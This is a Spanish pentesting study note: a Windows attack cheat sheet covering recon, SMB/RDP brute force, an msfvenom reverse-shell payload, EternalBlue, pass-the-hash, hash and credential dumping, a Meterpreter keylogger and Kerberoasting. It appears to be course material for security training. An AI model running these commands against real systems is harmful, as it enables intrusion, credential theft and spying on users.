

> [!info] Objetivo
> Guía concisa para explotar máquinas Windows desde el reconocimiento hasta la escalada.

---

## Fase 1: Reconocimiento

> [!tip] Descubrir hosts y servicios

```bash
# Escaneo completo
nmap -sC -sV -O -p- <target>

# SMB específico
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* <target>

# PowerShell remoto
nmap -p 5985,5986 --script http-winrm-info <target>
```

---

## Fase 2: Enumeración

> [!important] Encontrar vectores de ataque

### SMB

```bash
# Enumeración
smbclient -L //<target> -U user%pass
enum4linux -a //<target>
crackmapexec smb <target>

# Shares abiertos
smbclient //<target>/share -N

# Nmap scripts
nmap -p 445 --script smb-enum-shares,smb-enum-users <target>
```

### RDP

```bash
# Verificar si está abierto
nmap -p 3389 <target>

# Fuerza bruta
hydra -l administrator -P passwords.txt rdp://<target>
```

### WinRM

```bash
# Verificar
nmap -p 5985,5986 <target>

# Conexión
evil-winrm -i <target> -u user -p password
```

### HTTP/IIS

```bash
# Directorios
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt

# ASPX shells
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<tu_ip> LPORT=4444 -f aspx -o shell.aspx
```

---

## Fase 3: Explotación

> [!danger] Obtener acceso

### PSExec (Impacket)

```bash
# Con credenciales
impacket-psexec user:pass@<target>

# Pass-the-Hash
impacket-psexec -hashes :<NTLM_HASH> user@<target>
```

### WMIExec

```bash
# Shell semi-interactiva
impacket-wmiexec user:pass@<target>

# Pass-the-Hash
impacket-wmiexec -hashes :<NTLM_HASH> user@<target>
```

### SMBExec

```bash
impacket-smbexec user:pass@<target>
```

### Metasploit

```bash
# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_ip>
run
```

### MS17-010 (Manual)

```bash
# Verificar vulnerabilidad
nmap -p 445 --script smb-vuln-ms17-010 <target>

# Explotar con Metasploit
use exploit/windows/smb/ms17_010_eternalblue
```

---

## Fase 4: Escalada de Privilegios

> [!warning] Conseguir SYSTEM

### Diagnóstico

```bash
# Información del sistema
systeminfo
hostname

# Usuario actual
whoami /all

# Servicios
sc query

# Programas instalados
wmic product get name,version

# Drivers
driverquery

# Puertos abiertos
netstat -ano

#防火墙
netsh advfirewall show allprofiles
```

### Técnicas Comunes

| Vector | Herramienta |
|--------|-------------|
| Token impersonation | [[Metasploit#Meterpreter — Sistema|getsystem]] |
| Service abuse | sc config, sc start |
| AlwaysInstallElevated | MSI installer |
| Unquoted service path | Buscar rutas sin comillas |
| DLL hijacking | Reemplazar DLL |
| Kernel exploit | SearchSploit |

### Herramientas

```bash
# WinPEAS
winpeas.exe

# PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# SharpUp
SharpUp.exe audit

# Metasploit
run post/multi/recon/local_exploit_suggester
```

---

## Fase 5: Post-Explotación

> [!note] Recopilar información y credenciales

### Meterpreter

```bash
# Info del sistema
sysinfo
getuid

# Extraer hashes
hashdump

# Keylogger
keyscan_start
keyscan_dump

# Migrar proceso
migrate <PID>

# Cargar Mimikatz
load kiwi
creds_all
```

### Impacket

```bash
# Extraer hashes
impacket-secretsdump user:pass@<target>

# Solo NTLM
impacket-secretsdump -just-dc-ntlm user:pass@<target>
```

### PowerShell

```bash
# Credenciales guardadas
cmdkey /list
vaultcmd /listcreds:"Windows Credentials" /all

# Historial de comandos
Get-Content (Get-PSReadLineOption).HistorySavePath
```

---

## Fase 6: Movimiento Lateral

> [!tip] Moverse en la red

```bash
# Pass-the-Hash
impacket-psexec -hashes :<NTLM_HASH> user@<target>

# Kerberoasting
impacket-GetUserSPNs user:pass@<domain> -request

# PSRemoting
Enter-PSSession -ComputerName <target> -Credential <cred>
```

---

#checklist
- [ ] Reconocimiento completado
- [ ] SMB/RDP/WinRM enumerados
- [ ] Vector de ataque identificado
- [ ] Acceso obtenido
- [ ] Escalada de privilegios completada
- [ ] Hashes extraídos
- [ ] Movimiento lateral realizado

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes evolve/BLOQUE 8.md|BLOQUE 8]— Redes, SMB / Impacket, Windows
- [[../06 - Explotacion y Post-Explotacion/Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]— Escalada de Privilegios, Post-Explotación, Redes
- [[../../apuntes Chema/Introducción a Consolas - Bash y PowerShell.md|Introducción a Consolas - Bash y PowerShell]— Escalada de Privilegios, Post-Explotación, Redes
- [[../../comandos/SMB_Impacket.md|SMB_Impacket]— Redes, SMB / Impacket, Windows
- [[../../comandos/Metasploit.md|Metasploit]— Metasploit, Post-Explotación, Redes
- [[../../apuntes evolve/BLOQUE 5.md|BLOQUE 5]— Escalada de Privilegios, Metasploit, Post-Explotación

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/SMB_Impacket|SMB / Impacket]]

> #escalada-privilegios #metasploit #post-explotacion #redes #smb-impacket #windows
